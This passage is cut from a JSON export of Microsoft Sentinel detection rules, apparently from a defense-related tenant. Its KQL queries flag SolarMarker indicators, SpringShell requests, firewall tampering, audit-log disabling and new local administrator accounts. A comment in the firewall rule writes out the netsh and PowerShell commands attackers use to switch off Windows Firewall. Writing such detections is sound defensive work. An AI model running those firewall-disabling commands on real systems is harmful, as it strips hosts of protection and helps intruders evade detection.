\r\n\"1ad2af16a803f6f72f3f8bd305fe2e1b2049ecc8c401ed48e72446abb33022f8\", \r\n\"67735dd94093998ea9011435f6e56f90e3d66131b841706c4418c14907a497f9\", \r\n\"5239c3b84de73e2a5d9a2ea3f99889f5c81769df388dae21db37a37688f6617e\", \r\n\"5a2005552ba03f22f4d89d638b7e87b1dc1397c82f665fe3c63fd7d29bc6215b\", \r\n\"44af59a2d70ba23f2f80d80090d11184ef923a746c0c9ea3c81922bd8d899346\", \r\n\"2f7287a8b0c612801e77de6c2f37e22e0a67579f203a0aaf40095bf6ff70e6ee\", \r\n\"0c933001de544ebc071d175d9f8e3bfad8066b532dc69dea4c713c52eb6a64a0\", \r\n\"067ead7f7950dac95836899d08e93e6888fc87603b9ebf49d10ffeaed27ae466\", \r\n\"a9df1cb6aa6061056b78ad88e7101b076cf20c1a82cc79b1215d1ea80c3fbd2c\", \r\n\"3407a30a697cc9ad2aa84fddc9f643a6b0f2012b286f99f5ac01064bbd56e09a\", \r\n\"7cc35fbce4b353c541f1ee62366248cc072d1c7ce38b1d5ef5db4a2414f26e08\", \r\n\"7ce31f51f539761f9922bec50d38c6b9c0d6cc3a912517d947bc0a49dd507026\", \r\n\"bbfae2ab644c8d0f1ba82b01032b1962c43855cc6716193ce872ac16cda166df\", \r\n\"3be8e9f9e76df60bc682887ea31813762e9d2c316260a702c3b3e54391a9111b\", \r\n\"11543f09c416237d92090cebbefafdb2f03cec72a6f3fdedf8afe3c315181b5a\", \r\n\"b0e926d0e8a2379173ce220071d409839d02a87f7b25f39e29d9e47afa4f7378\"]);\r\nfind in (Device*) where (RemoteIP in~ (IPsuspect) or LocalIP in~ (IPsuspect)\r\nor FileOriginIP in~ (IPsuspect) or FileName in~ (Filesuspect) or InitiatingProcessFileName in~ (Filesuspect)\r\nor SHA256 in~ (Hashsuspect))","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"RemoteIP"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"DeviceName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":[],"techniques":[],"displayName":"SolarMarker on Endpoint","enabled":true,"description":"This analytic looks for IoCs indicating that the SolarMarker Malware has been detected on an endpoint\nPLATFORM:Microsoft 365,IaaS\nMITRE:TA0005;T1562;T1562.008","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T21:07:20.7283196Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/ea4c8c82-ebc1-48d5-a09c-80704461cce1","name":"ea4c8c82-ebc1-48d5-a09c-80704461cce1","etag":"\"8600a896-0000-2700-0000-66fdb58e0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"DeviceNetworkEvents\r\n| where ActionType =~ \"NetworkSignatureInspected\"\r\n| where AdditionalFields contains \".jsp?cmd=\"\r\n| summarize make_set(AdditionalFields, 5), min(TimeGenerated), max(TimeGenerated) by DeviceId, DeviceName ","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"DeviceName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":[],"techniques":[],"displayName":"SpringShell","enabled":true,"description":"This analytic looks for Spring 4 Shell activity\nPLATFORM:Azure AD,Microsoft 365,IaaS\nMITRE:TA0003;T1136;T1136.003","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T21:05:17.2391055Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/563b01b5-5792-40cb-a475-91af0fb7ae85","name":"563b01b5-5792-40cb-a475-91af0fb7ae85","etag":"\"8700a5e4-0000-2700-0000-66fdcabc0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"//Updated 11/2 and removed firewall enumeration since it is not a indication of a disabled firewall\r\n//Also adjusted how data is projected and added AAD lookup to query\r\n//Russian-linked Shuckworm espionage group (aka Gamaredon, Armageddon) uses this technique in several versions of it's Pterodo series of backdoors.\r\n//See the following for references\r\n//https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/shuckworm-intense-campaign-ukraine\r\n//Gamaredon Group - https://attack.mitre.org/groups/G0047/\r\n//Impair Defenses: Disable or Modify System Firewall - https://attack.mitre.org/techniques/T1562/004/\r\n//If any of the following registry keys is set to DWORD (0x00000000) it could indicate the windows firewall is disabled.\r\n//#HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile\\EnableFirewall\r\n//#HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile\\EnableFirewall\r\n//#HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\EnableFirewall\r\n//In a similar fashion firewall rules are stored in registry keys ending in the following \\Parameters\\FirewallPolicy\\FirewallRules and contain the term Action=Allow when adding a new rule\r\n//https://www.winhelponline.com/blog/enable-and-disable-windows-firewall-quickly-using-command-line/\r\n//Given the appropriate permission firewall can be disabled or modified using the following commands\r\n//netsh advfirewall set <privateprofile/publicprofile/domainprofile> state off\r\n//netsh a s <profile> state off\r\n//Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False\r\n//An attacked can enumerate the current state of the firewall before making changes, this also could be indication of malicious behavior. Examples below\r\n//'netsh advfirewall show allprofiles'\r\n//'netsh a show allprofiles'\r\n//false positives could occur with administrative activities or programs that alter the Windows Firewall as part of the installation process.\r\nlet signInLookup = (\r\nSigninLogs\r\n| where TimeGenerated >= ago(1d)\r\n| where DeviceDetail contains \"displayName\"\r\n| extend DeviceDetailJson = parse_json(DeviceDetail)\r\n| extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\r\n| distinct DeviceNameSI, UserPrincipalName, UserDisplayName\r\n);\r\n(union isfuzzy=true(\r\nDeviceRegistryEvents\r\n| where RegistryValueName startswith @'HKLM\\System\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy' and RegistryValueName endswith @'\\EnableFirewall' and RegistryValueData == 0\r\n| extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\r\n| join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\r\n| project Timestamp = TimeGenerated, \r\nHostCustomEntity = DeviceName, \r\nDeviceId, \r\nAccountCustomName = UserPrincipalName,\r\nInitiatingProcessAccountName, \r\nAccountCustomDomain = InitiatingProcessAccountDomain, \r\nRegistryValueName, \r\nRegistryValueData, \r\nNote = \"Firewall Disabled\"\r\n),\r\n(DeviceRegistryEvents\r\n| where RegistryValueName startswith @'HKLM\\System\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy' and RegistryValueName endswith @'\\FirewallRules' and RegistryValueData contains \"Action=Allow\"\r\n| extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\r\n| join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\r\n| project Timestamp = TimeGenerated, \r\nHostCustomEntity = DeviceName, \r\nDeviceId, \r\nAccountCustomName = UserPrincipalName,\r\nInitiatingProcessAccountName, \r\nAccountCustomDomain = InitiatingProcessAccountDomain, \r\nRegistryValueName, \r\nRegistryValueData, \r\nNote = \"Firewall Modified\"\r\n),\r\n(DeviceEvents\r\n| where InitiatingProcessCommandLine has_all (\"netsh\", \"advfirewall\", \"set\", \"state\", \"'off'\") or InitiatingProcessCommandLine has_all (\"netsh\", \"a\", \"s\", \"state\", \"'off'\")\r\n| extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\r\n| join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\r\n| project Timestamp = TimeGenerated, \r\nHostCustomEntity = DeviceName, \r\nDeviceId, \r\nAccountCustomName = UserPrincipalName,\r\nInitiatingProcessAccountName, \r\nAccountCustomDomain = InitiatingProcessAccountDomain, \r\nInitiatingProcessCommandLine, \r\nNote = \"Firewall Disabled\"\r\n),\r\n(DeviceEvents\r\n| where ActionType == \"PowerShellCommand\"\r\n| where AdditionalFields has \"Set-NetFirewallProfile\"\r\n| extend PowershellCommand = parse_json(AdditionalFields).Command\r\n| extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\r\n| join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\r\n| project Timestamp = TimeGenerated, \r\nHostCustomEntity = DeviceName, \r\nDeviceId,\r\nAccountCustomName = UserPrincipalName,\r\nInitiatingProcessAccountName, \r\nAccountCustomDomain = InitiatingProcessAccountDomain, \r\nInitiatingProcessCommandLine, \r\nNote = \"Firewall Altered by PowerShell\"\r\n)\r\n)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"HostCustomEntity"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomName"},{"identifier":"NTDomain","columnName":"AccountCustomDomain"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":["T1562"],"displayName":"BAH_Firewall_Tampering","enabled":true,"description":"One way that malicious actors use to avoid detection is to disable or change firewall rules. This analytic seeks to detect various ways the windows firewall can be manipulated.\nPLATFORM:Windows\nMITRE:TA0005;T1562","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:35:39.0091648Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/6aa38a39-dbb8-4323-9d6e-33ceacfdb22f","name":"6aa38a39-dbb8-4323-9d6e-33ceacfdb22f","etag":"\"8700349f-0000-2700-0000-66fdc5fa0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"//Author: Stephen Rowley\n//Description: A default OWA mailbox policy is configured for the entire tenant that permits certain functions in Outlook Web App. This analytic monitors any event in which the policy is changed or deleted.\n//False Positives: Can alert on legitimate activity, but should be investigated to confirm as these changes should rarely happen.\nOfficeActivity\n| where Operation in ('Set-OwaMailboxPolicy', 'Remove-OwaMailboxPolicy')\n| where not(UserId contains \"NT AUTHORITY\\\\SYSTEM\")\n| extend Time = TimeGenerated\n| project Time, Operation, UserId, ClientIP, OfficeObjectId, Type\n//MITRE","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"UserId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"ClientIP"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion","Persistence","PrivilegeEscalation"],"techniques":["T1556","T1078","T1550"],"displayName":"BAH_TCG-OWADefaultMailboxPolicy","enabled":true,"description":"This rule is focused on monitoring changes or deletions of a default OWA (Outlook Web App) mailbox policy that is configured for the entire tenant. This policy permits or restricts specific functions within Outlook Web App. The purpose of this analytic is to detect and alert on any events where the default OWA mailbox policy is altered or removed. False Positives: This rule can generate alerts for legitimate activity, as changes to the default OWA mailbox policy should rarely occur. However, any alert should be investigated to confirm its validity.\nPLATFORM:Microsoft 365\nMITRE:TA0003;T1078;T1078.004,TA0004;T1078;T1078.004,TA0005;T1078;T1078.004;T1550;T1550.001;T1550.004;T1556;T1556.006;T1556.007","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:15:20.8124079Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/34f56049-f02d-44f8-91e2-429f80c0f1e5","name":"34f56049-f02d-44f8-91e2-429f80c0f1e5","etag":"\"8700299c-0000-2700-0000-66fdc5ca0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5M","queryPeriod":"PT5M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"//Author: Stephen Rowley\r\n//Description: A setting exists in SharePoint to prevent users from downloading infected files. This analytic monitors that specific setting in the tenant-wide SharePoint settings.\r\n//False Positives: Can alert on legitimate changes, but should be investigated anyway to confirm.\r\nOfficeActivity\r\n| where RecordType == \"SharePoint\"\r\n| where Operation in ('DisallowInfectedFileDownloadDisabled', 'DisallowInfectedFileDownloadEnabled')\r\n//MITRE\r\n| extend Time = TimeGenerated\r\n| project Time, Operation, UserId, ClientIP, OfficeObjectId, Type","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"UserId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"ClientIP"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence","PrivilegeEscalation","DefenseEvasion"],"techniques":["T1078","T1562"],"displayName":"BAH_TCG-SharePointDisallowInfectedFileDownloads","enabled":true,"description":"This rule focuses on monitoring a specific setting in SharePoint that controls whether users are allowed to download potentially infected files. The analytic tracks changes to this tenant-wide SharePoint setting.\n\nFalse Positives: This rule can generate alerts for legitimate changes, but it's essential to investigate each alert to confirm its validity.\nPLATFORM:Microsoft 365\nMITRE:TA0003;T1078;T1078.004,TA0004;T1078;T1078.004,TA0005;T1078;T1078.004;T1562;T1562.008","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:14:33.6129607Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/ef202719-8e75-4fc1-a1c5-eb9ed0cd1495","name":"ef202719-8e75-4fc1-a1c5-eb9ed0cd1495","etag":"\"870079d7-0000-2700-0000-66fdc9e70000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"//Author: Stephen Rowley\r\n//Description: Intune devices can be registered as either personal or corporate devices. All devices in the tenant should be marked as corporate, so this analytic will report on any misconfigurations.\r\n//False Positives: None known\r\nIntuneManagedDevices_CL\r\n| where managedDeviceOwnerType_s in (\"Personal\", \"personal\" \"\")\r\n| project\r\n    DeviceType = case(isempty(managedDeviceOwnerType_s), \"Unknown\", managedDeviceOwnerType_s),\r\n    TimeGenerated,\r\n    DeviceName = deviceName_s,\r\n    ID = id_g,\r\n    DeviceId = easDeviceId_s,\r\n    Compliant = complianceState_s,\r\n    ManagementAgent = managementAgent_s,\r\n    OS = operatingSystem_s","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1200"],"displayName":"BAH_Intune_Corporate_vs_Personal","enabled":false,"description":"Intune devices can be registered as either personal or corporate devices. All devices in the tenant should be marked as corporate, so this analytic will report on any misconfigurations.\nPLATFORM:Windows\nMITRE:T00001;T1200","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:32:07.41036Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/2afde03f-55a5-46fa-b76c-4198a1b10768","name":"2afde03f-55a5-46fa-b76c-4198a1b10768","etag":"\"fc041847-0000-2700-0000-62b9e7c00000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Title: UEM6-OutsideLastCheckinTime\n//Description: MDE will report both first and last check-in time in which the MDE agent on the endpoint contacts the cloud service. If a device has not checked in within a certain timeframe, escalation may be required to determine the location and status of the device. It could indicate a misconfiguration, connectivity problems, or a lost or stolen device.\nDefenderMachines_CL\n| where TimeGenerated >= ago(24h)\n| where lastSeen_t <= ago(90d)\n| extend Time = TimeGenerated, Hostname = computerDnsName_s, LastSeenTime = lastSeen_t, OS = osPlatform_s, LastInternalIPAddress = lastIpAddress_s, LastExternalIPAddress = lastExternalIpAddress_s, AADJoinStatus = isAadJoined_b, AADDeviceID = aadDeviceId_g\n| project Time, Hostname, LastSeenTime, OS, LastInternalIPAddress, LastExternalIPAddress, AADJoinStatus, AADDeviceID\n//MITRE: T1562 - Impair Defenses","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"Hostname"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"LastExternalIPAddress"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"LastInternalIPAddress"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":["T1562"],"displayName":"BAH-Defender-OutsideLastCheckinTime","enabled":false,"description":"MDE will report both first and last check-in time in which the MDE agent on the endpoint contacts the cloud service. If a device has not checked in within a certain timeframe, escalation may be required to determine the location and status of the device. It could indicate a misconfiguration, connectivity problems, or a lost or stolen device.","alertRuleTemplateName":null,"lastModifiedUtc":"2022-06-27T17:24:16.2861346Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/4b2e8050-5fea-4c06-8a3b-22b8ee9bdafc","name":"4b2e8050-5fea-4c06-8a3b-22b8ee9bdafc","etag":"\"8700c4e7-0000-2700-0000-66fdcaea0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5M","queryPeriod":"PT5M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Author: Stephen Rowley\n//Description: This analytic looks for tenant-wide changes to the Exchange audit log.\n//False Positives: It is possible an alert will be raised when legitimate changes are occurring, but they should be rare.\nOfficeActivity\n| where OfficeWorkload == \"Exchange\"\n| where Operation contains \"Set-AdminAuditLogConfig\"\n| where countof(Parameters, @'\"AdminAuditLogEnabled\",\"Value\":\"False\"}') > 0 or countof(Parameters, @'\"UnifiedAuditLogIngestionEnabled\",\"Value\":\"False\"}') > 0\n| project TimeGenerated, UserId, Parameters, OriginatingServer, OrganizationName","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"UserId"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":["T1562"],"displayName":"BAH_ExchangeAuditingChanges","enabled":true,"description":"This analytic looks for tenant-wide changes to the Exchange audit log.\nPLATFORM:Windows\nMITRE:TA0005;T1562","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:36:24.9257313Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/afb5b6d6-2975-4f4d-a088-10e02a3df8d9","name":"afb5b6d6-2975-4f4d-a088-10e02a3df8d9","etag":"\"8700269a-0000-2700-0000-66fdc5a70000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5M","queryPeriod":"PT5M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Author: Stephen Rowley\n//Description: This analytic looks for activity related to use of the Set-SPOTenantSyncClientRestriction cmdlet and changing of the 'DomainGuids' parameter. This accepts a string that refers to the tenant GUID. '-GrooveBlockOption' is referenced in this in this part of the TCG, but has since been deprecated so only changes to trusted tenants is monitored.\n//False Positives: This analytic could alert on legitimate activity, but should still be investigated to confirm.\nOfficeActivity\n| where RecordType == \"SharePoint\"\n| where Operation == \"TrustedSyncClientDomainListChanged\"\n| project TimeGenerated, Operation, UserId, ClientIP","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"ClientIP"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"UserId"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence"],"techniques":[],"displayName":"BAH_TCG-SPO-TrustedDomainListChanged","enabled":true,"description":"This analytic looks for activity related to use of the Set-SPOTenantSyncClientRestriction cmdlet and changing of the 'DomainGuids' parameter. This accepts a string that refers to the tenant GUID.\n\n'-GrooveBlockOption' is referenced in this in this part of the TCG, but has since been deprecated so only changes to trusted tenants is monitored.\nPLATFORM:Microsoft 365\nMITRE:TA0006;T1552;T1552.008,TA0007;T1526","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:13:59.1523444Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/4d095e6e-fa39-4208-9a1a-e39285ec3567","name":"4d095e6e-fa39-4208-9a1a-e39285ec3567","etag":"\"7200bd7a-0000-2700-0000-64f0d9f40000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let Actions = dynamic([\"UserAccountAddedToLocalGroup\", \"UserAccountCreated\"]);\r\nlet main=DeviceEvents\r\n    | where TimeGenerated >= ago(24h)\r\n    | where ActionType in (Actions)\r\n    | where AdditionalFields.GroupName == \"Administrators\" or isempty(AdditionalFields.GroupName)\r\n    | extend Action = iif(isnotempty(AdditionalFields), pack(\"ActionPerformed\", ActionType, \"AdditionalInformation\", AdditionalFields), pack(\"ActionPerformed\", ActionType, \"Account\", AccountName))\r\n    | summarize\r\n        Action = make_list(Action, 20),\r\n        AccountSID = make_set(AccountSid, 20),\r\n        AccountDomain = make_set(InitiatingProcessAccountDomain, 2),\r\n        ProcessLogonID = make_set(InitiatingProcessLogonId, 20),\r\n        ProcessAccountSID = make_set(InitiatingProcessAccountSid, 2)\r\n        by DeviceId, DeviceName, InitiatingProcessAccountName\r\n    | where Actions has_all (Actions)\r\n    | extend InitiatingProcessAccountName = toupper(InitiatingProcessAccountName);\r\nlet temp =main\r\n    | summarize make_set(InitiatingProcessAccountName, 1);\r\nmain\r\n| join kind=leftouter (\r\n    userlookup\r\n    | where AccountName in (temp)\r\n    )\r\n    on $left.InitiatingProcessAccountName == $right.AccountName\r\n| mv-apply LocalAccountName = todynamic(Action) on (where LocalAccountName has \"Account\"\r\n    | extend LocalAccountName = LocalAccountName.Account)\r\n| extend Description = strcat(\"User: \", AccountDisplayName, \" who is a \", JobTitle, \" at \", Department, \" \", City, \"\\n has been observed creating a local user account \", '\"', LocalAccountName, '\"', \" on \", DeviceName, \" and then adding that,\\n or another local user account to the local Administrators group within 24 hours.\")\r\n| project-reorder Description, *","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence","PrivilegeEscalation"],"techniques":["T1136"],"displayName":"(TEST) Local Computer User Created Then Added to Administrator","enabled":false,"description":"** Testing this analytic with Auto-Notify**\n**Please do not work**\nLocal Computer account was created on end user machine and within the same 24 hours, a local user account was then added to the local computer administrators group.","alertRuleTemplateName":null,"lastModifiedUtc":"2023-08-31T18:20:36.8525962Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/5b60b9b5-39db-4ffb-81a1-89a4c28bb494","name":"5b60b9b5-39db-4ffb-81a1-89a4c28bb494","etag":"\"8500fae8-0000-2700-0000-66fdacb30000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// This analytic queries the following tables and compare IP Address entries to our threat intelligence feeds.\r\nunion withsource=SourceTable\r\n(SigninLogs\r\n| where IPAddress in~ (ThreatIPs)),\r\n(BehaviorAnalytics\r\n| where SourceIPAddress in~ (ThreatIPs)\r\n| project-rename  IPAddress = SourceIPAddress),\r\n(DeviceLogonEvents\r\n| where RemoteIP in~ (ThreatIPs)\r\n| project-rename IPAddress = RemoteIP),\r\n(DeviceNetworkEvents\r\n| where RemoteIP in~ (ThreatIPs)\r\n| project-rename IPAddress = RemoteIP),\r\n(DeviceEvents\r\n| where RemoteIP in~ (ThreatIPs)\r\n| project-rename IPAddress = RemoteIP),\r\n(OfficeActivity\r\n| where ClientIP in~ (ThreatIPs)\r\n| project-rename IPAddress = ClientIP),\r\n(AzureActivity\r\n| where CallerIpAddress in~ (ThreatIPs)\r\n| project-rename IPAddress = CallerIpAddress),\r\n(AuditLogs\r\n| where isnotempty(InitiatedBy.user.ipAddress)\r\n| extend IPAddress = InitiatedBy.user.ipAddress\r\n| where IPAddress in~ (ThreatIPs))\r\n| project-rename IPAddress = IPAddress_string\r\n| extend Description = strcat(\"This alert was triggered due to the presence of IPAddress: \",IPAddress, \" observed in this query. This IP Address is associated with one of our Threat Intelligence feeds and should be examined thoroughly.\")\r\n| project-reorder Description, IPAddress, SourceTable,*","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPAddress"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CommandAndControl","InitialAccess"],"techniques":[],"displayName":"TI Feed IP Hunting","enabled":true,"description":"This query looks at several tables and compares our threat intelligence feeds for associated IP 